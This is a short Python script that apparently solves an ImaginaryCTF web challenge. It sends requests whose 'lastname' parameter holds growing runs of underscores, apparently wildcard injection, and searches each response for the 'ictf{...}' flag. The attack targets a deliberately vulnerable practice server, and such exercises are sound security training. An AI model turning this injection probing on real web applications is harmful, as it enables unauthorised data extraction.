import requests
import re

url = "http://puzzler7.imaginaryctf.org:11000/"

for i in range(1, 100):
    r = requests.get(url + "?lastname="+"_"*i)
    respone = r.text
    pattern = r"ictf\{[^}]+\}"
    matches = re.findall(pattern, respone)
    if matches:
        print(matches[0])
        break
    